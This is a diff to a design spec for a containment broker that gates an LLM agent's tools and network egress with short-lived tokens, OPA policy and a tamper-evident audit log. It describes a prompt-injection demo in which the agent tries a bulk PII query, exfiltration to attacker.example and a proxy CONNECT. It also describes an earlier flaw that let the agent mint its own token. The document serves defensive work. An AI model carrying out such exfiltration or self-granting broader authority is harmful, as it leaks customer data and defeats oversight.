@@ -46,15 +46,20 @@ The corollary that shapes the whole architecture: **containment is a deployment 
 
 **`agent-runtime`** — Python agent loop on `claude-sonnet-5`. Four tools: `read_document(doc_id)`, `query_customers(filter)`, `http_fetch(url)`, `send_email(to, subject, body)`. Ships with no credentials and no network route except the broker. Receives its task token by injection at start.
 
-**`broker`** — FastAPI, dual-homed, three surfaces:
+**`broker`** — FastAPI, the enforcement point. Two agent-facing surfaces:
 
 | Surface | Bound to | Purpose |
 |---|---|---|
-| `POST /v1/tokens` | `:8081`, control-plane interface only | Mints a short-lived task-bound identity. **Not reachable from `agent-net`** — this is enforced by binding, not by an auth check. |
 | `POST /v1/tools/{tool}/invoke` | `:8080`, agent-facing | Authorizes against OPA, then executes against the real backend. |
 | `:3128` forward proxy | `:3128`, agent-facing | The only egress path off `agent-net`. Authorizes per destination against the caller's token. |
 
-Separate listeners matter: the agent must not be able to reach the minting endpoint at all, and a network-level answer is stronger than a policy-level one.
+**`broker-control`** — a separate service, a separate process, and a separate network:
+
+| Surface | Bound to | Purpose |
+|---|---|---|
+| `POST /v1/tokens` | `:8081`, on `backend-net` only | Mints a short-lived task-bound identity. **No route exists from `agent-net`** — this is enforced by topology, not by an auth check (the route has none). |
+
+Separate *services* matter, not just separate listeners. An earlier implementation put the minting route on `0.0.0.0:8081` inside the broker process, which is attached to `agent-net` by necessity — so `agent-runtime` could reach `broker:8081` and mint itself an arbitrary token. `ports:` in Compose publishes to the host; it does not restrict container-to-container reach. The keypair is now generated outside every container and split: `broker-control` loads the private key, the broker loads only the public key. **The enforcement point holds no signing key**, so compromising the one service the agent can reach still does not yield the ability to mint.
 
 **`opa`** — Open Policy Agent, official image, Rego bundle mounted from `policies/`. Chosen over Cedar or hand-rolled Python because the JD names policy-as-code explicitly and the policy files are a printable artifact.
 
@@ -91,7 +96,7 @@ The runtime holds no signing key, so **the agent can never mint itself a broader
 
 This is the answer to "why not just an API key": an API key is ambient authority with no expiry and no declared intent. This is a capability scoped to a stated purpose, bound to a single task, expiring in minutes.
 
-Ed25519 rather than HMAC: the broker is currently both minter and verifier, so symmetric signing would suffice, but asymmetric keys mean verification never confers minting — the property that lets the design extend to distributed verifiers without redesign.
+Ed25519 rather than HMAC: asymmetric keys mean verification never confers minting. That is not a future-proofing argument here, it is load-bearing today — the minter and the verifier are different processes on different networks, and the verifier holds only the public half. Symmetric signing would put a minting key inside the service the agent can reach.
 
 ## 5. Policy model
 
@@ -298,26 +303,35 @@ The second destination is **on the egress allowlist**. A naive allowlist-only br
 
 **Beat 2 — `--profile guarded`.** Identical code, identical cassette. Show the LLM **still following the injection** — the claim is not that the model was fixed — then watch each step die against policy, including the fallback.
 
-**Beat 3 — `warden replay 4711`.**
+**Beat 3 — `warden replay 4711`.** This block is what the implementation actually prints, captured from a run against a real OPA server and the real policy bundle. An earlier draft of this spec showed a hand-written artifact with annotations the renderer never emits (an injected-instruction marker, inline row arithmetic, a rule name on the allow lines); it has been corrected down to the truth rather than the code being grown to match the marketing.
 
 ```
 task 4711  purpose=support-triage  agent=triage-bot
-  ✓ read_document(ticket-4711)              allow  tools.allowed
-  ✓ read_document(kb/refund-policy)         allow  tools.allowed
-      ⚠ injected instruction in content digest sha256:9f2c…
-  ✓ query_customers(id=8812)                allow  rows.bounded (1 ≤ 50)
+  ✓ read_document(ticket-4711)             allow  allow
+  ✓ read_document(kb/refund-policy)        allow  allow
+  ✓ query_customers(rows≈1)                allow  allow
       ⛔ TAINT: task now holds data_class=pii
-  ✗ query_customers(SELECT *)               DENY   rows.bounded (10312 > 50)
-  ✗ http_fetch(attacker.example/collect)    DENY   egress.allowlist
-  ✗ CONNECT attacker.example:443            DENY   egress.allowlist
-  ✗ http_fetch(docstore.internal/feedback)  DENY   egress.pii_sink   ← allowlisted host; taint denied it
-  ✓ send_email(customer:8812)               allow  mail.counterparty
-  chain intact: 9 records, head sha256:41ab…
+  ✗ query_customers(rows≈10312)            DENY   rows.bounded
+  ✗ http_fetch(attacker.example/collect)   DENY   egress.allowlist
+  ✗ http_fetch(docstore.internal/feedback) DENY   egress.pii_sink
+  ✓ send_email(customer:8812)              allow  allow
+  chain intact: 7 records, head sha256:de6d8b7d…
 ```
 
-Two things to say over this screen. First, it is the JD's "reconstruct the attack path" delivered as a printable artifact. Second — the last line — **the agent still completed its actual job.** The control is not "break the agent"; it is "the task succeeds and the attack fails." A containment design that also breaks legitimate work is not a design anyone ships.
+An allow carries the rule `allow`. `deny_reasons` is the source of truth and there was nothing in it; printing the name of a rule that did not fire would claim the log knows *why* a call was permitted, which it does not.
 
-**Pre-empting "is this canned?"** — cassettes replay LLM responses only. Policy decisions, network enforcement, and the audit chain all execute for real. A `--live` flag runs against the real API on request.
+The proxy's own record is not in this replay, and that is correct rather than a gap. A CONNECT arriving on `:3128` carries no `Proxy-Authorization` — nothing on `agent-net` holds a token to present — so it is refused before any policy question is asked, and with no token there is no task to attribute it to. It is recorded against the sentinel principal and shows up under `warden replay -`:
+
+```
+task -  purpose=-  agent=unauthenticated
+  ✗ CONNECT(attacker.example)              DENY   unauthenticated
+```
+
+`unauthenticated`, not `egress.allowlist`. That is the better line to have on the screen: the bypass attempt did not fail a destination check, it arrived with no authority whatsoever.
+
+Two things to say over this screen. First, it is the JD's "reconstruct the attack path" delivered as a printable artifact. Second — the last line — **the agent still completed its actual job.** The control is not "break the agent"; it is "the task succeeds and the attack fails." A containment design that also breaks legitimate work is not a design anyone ships. The chain line is also a real claim: `replay` calls `verify_chain()` and prints what it found, so a tampered log renders `⚠ CHAIN BROKEN at seq N` instead.
+
+**Pre-empting "is this canned?"** — cassettes replay LLM responses only. Policy decisions, network enforcement, and the audit chain all execute for real. A `--live` flag runs against the real API on request; it needs `pip install anthropic` and is not covered by CI.
 
 ## 10. Testing
 
